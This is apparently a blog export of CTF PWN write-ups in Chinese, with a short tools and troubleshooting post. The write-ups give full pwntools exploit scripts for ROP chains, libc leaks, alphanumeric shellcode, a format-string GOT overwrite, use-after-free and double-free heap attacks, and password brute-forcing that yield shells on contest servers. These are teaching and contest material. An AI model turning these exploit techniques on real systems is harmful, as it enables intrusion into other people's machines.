因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’ 而\$0就是’/bin/sh’，进一步就获得了shell。 题解的exp脚本如下： 123456789101112131415#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./bash_jail') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10006)p.recvuntil('&gt;')p.sendline('$0')p.interactive() hacker_system_v1程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。 通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver1')if debug: p= process('./hacker_system_ver1') context.log_level = 'debug' libc = ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048B1B')else: p = remote('111.230.149.72 ', 10005) libc = ELF('./libc32.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x34pr = 0x08048455pppr = 0x08048d49rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u32(p.recv(4))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p32(0x804bc00)+ p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(next(libc.search('/bin/sh')))p.send(rop)p.interactive()'''============================================================0x08048d4b : pop ebp ; ret0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048455 : pop ebx ; ret0x08048d4a : pop edi ; pop ebp ; ret0x08048d49 : pop esi ; pop edi ; pop ebp ; ret0x0804843e : ret0x080487f0 : ret 0x458b0x0804819c : ret 0x86940x080485ce : ret 0xeac1''' ez_shellcode_ver2这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int 80这样的指令。 解题的exp脚本如下： 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode_ver2') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10007)p.recvuntil('&gt;')shellcode = '''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''#a = shellcraft.sh()#print len(asm(shellcode))p.sendline((shellcode))p.interactive() LEVEL - WEEK 3hacker_system_ver2这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。 因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver2')if debug: p= process('./hacker_system_ver2') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d74')else: p = remote('111.230.149.72 ', 10008) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x30#pr = 0x08048455#pppr = 0x08048d49rdi_ret = 0x0000000000400fb3rsi_ret = 0x0000000000400fb1rbp_ret = 0x0000000000400800rop = padding + p64(0x602e00) + p64(rdi_ret) +p64(elf.got['puts']) + p64(elf.symbols['puts']) + p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400D74)#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''Gadgets information============================================================0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fb0 : pop r14 ; pop r15 ; ret0x0000000000400fb2 : pop r15 ; ret0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400800 : pop rbp ; ret0x0000000000400fb3 : pop rdi ; ret0x0000000000400fb1 : pop rsi ; pop r15 ; ret0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006a9 : ret0x0000000000400a29 : ret 0x8b48Unique gadgets found: 12''' calc题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。 漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。 利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from struct import packfrom pwn import *import timedebug=0if debug: p= process('./calc') #context.log_level = 'debug'else: p= remote('111.230.149.72 ', 10009)def get_rop_string(): rop = '' rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '/bin' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea064) # @ .data + 4 rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '//sh' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x080481c9) # pop ebx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080dee5d) # pop ecx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0806d445) # int 0x80 return ropdef add_save(num): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('a:') p.sendline(str(num)) p.recvuntil('b:') p.sendline('0') p.recvuntil('&gt;&gt;&gt;') p.recvuntil('&gt;') p.sendline('5') p.recvuntil('success!!')def padding(): for i in range(0,64): add_save(0xbadbad) print '[+] round',str(i) add_save(68)def rop_input(rop_string): for i in range(len(rop_string)/4): print hex(u32(rop_string[4*i:4*(i+1)])) add_save(u32(rop_string[4*i:4*(i+1)]))padding()#gdb.attach(p,'b *0x8048AC0')rop='\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'#print '[*] flag',flagrop_input(rop)p.recvuntil('&gt;')p.sendline('6')p.recvuntil('bye.')p.sendline('cat flag')p.interactive() zazahui_ver2和上一版本的zazahui有所不同，这次利用的是strcmp的比较。 同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。 逆向爆破flag的地址，可以大大缩短爆破次数。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui_ver2') #context.log_level = 'debug' gdb.attach(p,'b *0x80487AB')else: p = remote('111.230.149.72 ', 10010)dic = range(33,127)dic.append(0)#qdic.reverse()p.recvuntil('&gt;')start = 0x804A084end = 0x804A060flag=''i = start while i&gt;=end: pro = log.progress('go') for j in dic: pro.status('boom for '+hex(i)) bomb = (chr(j)+flag)+'\0'*(0xb0-len((chr(j)+flag)))+p32(i) p.send(bomb) if 'too' in p.recvuntil('&gt;'): flag = chr(j) + flag pro.success(hex(i)+': '+hex(j)+' '+chr(j)) i = i-1#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)#p.recv()print '[*] flag',flagp.interactive() message_saver程序实现了一个可以加解密存储的记事本，逻辑简单 只维护了一个变量作为message的存储结构，结构如下 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| length | address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其生成方法在add函数中： 在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。 在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。 并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。 利用UAF漏洞可以很容易的控制程序执行流程： 先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./message_saver')if debug: p= process('./message_saver') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400C64')else: p = remote('111.230.149.72 ', 10011) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('length:')p.sendline(str(0x100))p.sendline('p4nda')p.recvuntil('===')p.sendline('2')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline(p64(0x00)+p64(elf.got['puts'])+p64(0x40084D))p.recvuntil('&gt;')p.sendline('3')p.sendline('\0\0\0'+p64(0x00)+p64(elf.got['puts'])+p64(elf.symbols['puts']))p.recvuntil('&gt;')p.sendline('3')tmp = p.recvuntil('\n==')addr = tmp[-9:-3]puts_addr = u64(addr.ljust(8,'\0'))print '[+]puts addr : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline('/bin/sh\0'+p64(elf.got['puts'])+p64(libc.symbols['system']))p.interactive() LEVEL - WEEK 4ascii_art_market题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。 最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./ascii_art_maker')if debug: p= process('./ascii_art_maker') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x0400A2B')else: p = remote('111.230.149.72 ', 10012) libc = ELF('./libc64.so')target = 0x4009FCp.recvuntil('convert:')p.send('a'*0x80+p64(0x602c00)+p64(target))rdi_ret = 0x0000000000400a93rsi_ret = 0x0000000000400a91rbp_ret = 0x0000000000400640rop =p64(0xbadbad)+ p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.symbols['puts'])+ p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400A2B)rop = rop.ljust(0x80,'a')+p64(0x602c00-0x80)+p64(0x400A2B)#p.send(p64())p.send(rop)addr_leak = p.recvuntil('\x7f')[-6:]puts_addr = u64(addr_leak.ljust(8,'\0'))print '[+] puts : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''============================================================0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a90 : pop r14 ; pop r15 ; ret0x0000000000400a92 : pop r15 ; ret0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400640 : pop rbp ; ret0x00000000004009dd : pop rbx ; pop rbp ; ret0x0000000000400a93 : pop rdi ; ret0x0000000000400a91 : pop rsi ; pop r15 ; ret0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret0x0000000000400980 : ret 0x458b''' base64_decoder题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。 存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。 起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。 可以参考置顶日志的libc database使用方法 最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8'''%7$p offset'''from pwn import *import time,base64debug=0elf = ELF('./base64_decoder')if debug: p= process('./base64_decoder') context.log_level = 'debug' libc=ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048945')else: p = remote('111.230.149.72',10013)#process('./pwn1') libc = ELF('./libc6-i386_2.19-0ubuntu6.14_amd64.so')#base64.b64encode(s, altchars=None) p.recvuntil('&gt;')p.sendline(base64.b64encode('%2$p'))heap_addr = p.recvline()print '[*] heap addr:',heap_addrheap_addr_int = int(heap_addr[3:-1],16)print '[*] heap addr:',hex(heap_addr_int)p.recvuntil('&gt;')fmt = p32(heap_addr_int-0x110)+"%%%dc%%%d$hhn"%(200,7)p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')fmt = p32(elf.got['printf'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')printf_addr = u32(p.recv(4))print '[*] printf addr:',hex(printf_addr)p.recvuntil('&gt;')fmt = p32(elf.got['puts'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')puts_addr = u32(p.recv(4))print '[*] puts addr:',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[*] system addr:',hex(libc.symbols['system'])target = libc.symbols['system'] #print '[+] strcmp@got: ',hex(elf.got['strcmp'])p.recvuntil('&gt;')fmt = fmtstr_payload(7, &#123;elf.got['strcmp']: target&#125;, write_size='byte')p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')p.interactive() hacker_system_ver3函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38， 123456789100x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | length | name 1 | 0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 2 | name 3 | 0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 4 | age | 0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | intr addr | 0x38 +-+-+-+-+-+-+- 其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。 但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。 该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。 这里采用了bluecake@dubhe大佬的fastbin利用方法。 劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。 解题的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from pwn import *#import time,base64debug=0elf = ELF('./hacker_system_ver3')if debug: p= process('./hacker_system_ver3') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('111.230.149.72',10014)#process('./pwn1') libc = ELF('./libc64.so')def add(name,age,length,intro): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('name:') p.send(name) p.recvuntil('age:') p.sendline(str(age)) p.recvuntil('length:') p.sendline(str(length)) p.recvuntil('intro:') p.sendline(intro)def print_user(name): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('name:') p.sendline(name)def delete_user(name): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('name:') p.sendline(name)#step 1 leak libcadd('step1\n',0,0x20,'hack by p4nda')add('step1\n',0,0x20,'hack by p4nda')delete_user('step1')add('nop1\n',0,0x38,p64(0x18)+'1'.ljust(0x20,'\0')+p64(3)+p64(elf.got['puts']))print_user('1')p.recvuntil('intro:')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts addr :',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])#step 2 leak steakadd('step2\n',0,0x20,'hack by p4nda')add('step2\n',0,0x20,'hack by p4nda')delete_user('step2')add('nop2\n',0,0x38,p64(0x18)+'2'.ljust(0x20,'\0')+p64(3)+p64(libc.symbols['environ']))print_user('2')p.recvuntil('intro:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]stack addr :',hex(stack_addr)stack_offset =0x7ffd3af20438-0x7ffd3af20330#add('padding\n',18,0x138,'hack by p4nda')#delete_user('nop2')#delete_user('2')#delete_user()'''add('padding_3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')delete_user('step3')add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))delete_user('nop3')delete_user('3')delete_user('padding_3')add('ctrl3\n',18,0x38,p64(0xdeadbeef))'''add('step3\n',0,0x70,'hack by p4nda')add('step3\n',0,0x70,'hack by p4nda')delete_user('step3')delete_user('step3')print '[+]stack addr :',hex(stack_addr)#gdb.attach(p,'b *0x400a0f')add('step3\n',0,0x70,p64(0x61))add('step3\n',0,0x70,'hack by p4nda')add('step3\n',18,0x70,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')delete_user('step4')delete_user('step4')#gdb.attach(p,'b *0x400a0f')add('step4\n',0,0x50,p64(libc.symbols['__malloc_hook']+0x10+0x08*6))add('step4\n',0,0x50,'hack by p4nda')add('step4\n',0,0x50,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')add('padding\n',0,0x38,'hack by p4nda')delete_user('padding')add('step4\n',0,0x50,p64(0)*3+p64(stack_addr-stack_offset-0x8))add('step4\n',0,0x40,p64(0x0000000000401053)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))#add('step3\n',18,0x60,'a'*0x40)p.interactive()'''============================================================0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401050 : pop r14 ; pop r15 ; ret0x0000000000401052 : pop r15 ; ret0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400870 : pop rbp ; ret0x0000000000401053 : pop rdi ; ret0x0000000000401051 : pop rsi ; pop r15 ; ret0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400709 : ret0x0000000000400782 : ret 0x20180x0000000000400abd : ret 0x8b48''' 题目]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[问题解决及工具使用]]></title>
    <url>%2F2018%2F03%2F03%2Fquestion%2F</url>
    <content type="text"><![CDATA[记录一些工具的使用方法和遇到的问题解决途径 工具使用one_gadgetgithub : https://github.com/david942j/one_gadget 所谓 one_gadget 就是一个实现了直接执行system(‘/bin/sh’)的程序跳板。 常见的，可以使用one_gadget覆盖劫持got表、返回地址、hook（__malloc_hook、__free_hook）等等操作，也就是当可以劫持控制流后覆盖的捷径 安装方法安装one_gadget需要ruby环境，因为是由ruby写成的。 以ubuntu为例，首先安装ruby 1sudo apt-get install ruby 还需要安装ruby的包管理器 1sudo apt-get install gem 依赖安装好了以后就可以安装one_gadget了 1$ gem install one_gadget 使用方法一般针对libc使用，直接one_gadget libc.so就可以了 输出结果： 12345678910111213141516└─[$] &lt;&gt; one_gadget libc64.so 0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 当泄露了libc基地址以后再用libc base+offset就可以使用了，但需要注意one_gadget的输出是有一定限制的，如[$rax = NULL]，需要逐个尝试。 libc databasegithub: https://github.com/niklasb/libc-database 有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。 安装方法先下载libc database 1git clone https://github.com/niklasb/libc-database 利用get来下载流行的libc库 12cd libc-database./get 程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下 使用方法使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可 12$ ./find printf 260 puts f30archive-glibc (id libc6_2.19-10ubuntu2_i386) seccomp-toolsgithub： https://github.com/david942j/seccomp-tools 主要是针对linux seccomp沙箱规则的读取 安装方法1gem install seccomp-tools 如果遇到报错，可参考下面问题解决… 使用方法主要就用dump了… 1seccomp-tools dump ./xxxx 比如查看检查到的某通防机制 问题解决ida “sp-analysis failed” 错误问题描述具体情况是在分析QWB CTF 2018 比赛中raisepig一题中，发现某些函数在按F5进行反编译时，出现这个问题，导致无法查看反编译代码。 参考了本队大佬的博客以后，解决了问题。 解决方法问题原因貌似是在代码执行中的pop、push操作不匹配，导致ida解析的时候对esp的值产生错误造成的。这种不匹配可能对程序执行并无影响。 一种可能的解决办法是： 首先，在ida中打开栈指针的显示：options-general-stack pointer (勾选) 结果会在原来的地址偏移的旁边，显示函数栈内ESP寄存器的偏移： 可以看到在出现问题的函数中，retn前的偏移是一个非0值，这回导致ida识别函数出错，修改的目的就是使这个值为0，修改办法是使用“ALT + K”快捷键，强行使esp保持平衡，具体操作是： 在leave这一行（这很重要）按快捷键“ALT+K”，修改其值为leave前方标志的其ESP偏移值： 当发现，retn前标志的ESP偏移是00时，按F5应该就可以反编译了（不要care红色的报错，果断的按F5！） gem “ERROR: Failed to build gem native extension.”问题问题描述在安装seccomp-tools时，使用 1gem install seccomp-tools 命令时，出现报错 1234567 ERROR: Error installing seccomp-tools: ERROR: Failed to build gem native extension. /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/bin/ruby extconf.rb mkmf.rb can&apos;t find header files for ruby at /System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/lib/ruby/ruby.h 解决方法缺少ruby-dev，执行 1sudo apt-get install ruby-dev]]></content>
      <tags>
        <tag>Questions</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF 2018 PWN 题记录]]></title>
    <url>%2F2018%2F02%2F05%2Fhitctf%2F</url>
    <content type="text"><![CDATA[HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。 本次比赛共有五道PWN题： stackoverflow （栈溢出） login（爆破） DragonBall（整数溢出） nodes（溢出BSS段，影响程序逻辑） babynote（UAF） stackoverflow此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞 可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流 如程序中存在一个flag函数，可以直接获取flag exp.py脚本如下 123456789101112131415from pwn import *debug =0elf = ELF('./stackoverflow')if debug: p = process('./stackoverflow') context.log_level = 'debug'else: p = remote('111.230.132.82',40000) context.log_level = 'debug'p.recvuntil('Welcome to pwn world!\nLeave your name:')p.send('a'*0x28+p32(0xdeadbeef)+p32(0x80485df)+p32(0xdeadbeef)+p32(0xdeadbeef)+p32(0xc0ffee))p.interactive() login此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag 对比两个用户名密码的check函数可以发现其中的不同： 很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。 password的长度是0x20（抖机灵） 由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。 爆破的脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *'''10_adhUNwj_qidACn_qdXon912_uhdq6'''debug = 0if debug: p = process('./login') #libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' #libc = ELF('./libc_32.so.6')password = ''dic = range(33,127)def login(j): global password print 'password' + chr(j) if debug: p = process('./login') context.log_level = 'debug' else: p = remote('111.230.132.82', 40001) #context.log_level = 'debug' p.recvuntil('Username:') p.sendline('root') p.recvuntil('Password: ') p.sendline(password+chr(j)) a = p.recvline() print a if 'successful' in a: p.close() return chr(j) else: p.close() return '00'def boom(): global password for i in range(0,0x20): pro = log.progress('go') for j in dic: pro.status('boom for '+chr(j)) #tmp = '' tmp = login(j) #print tmp if tmp!='00': password = password + tmp pro.success(': is '+password) print 'password is ',password breakpassword = ''boom()p.interactive() DragonBall程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。 漏洞利用wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局… 突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode… 就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。 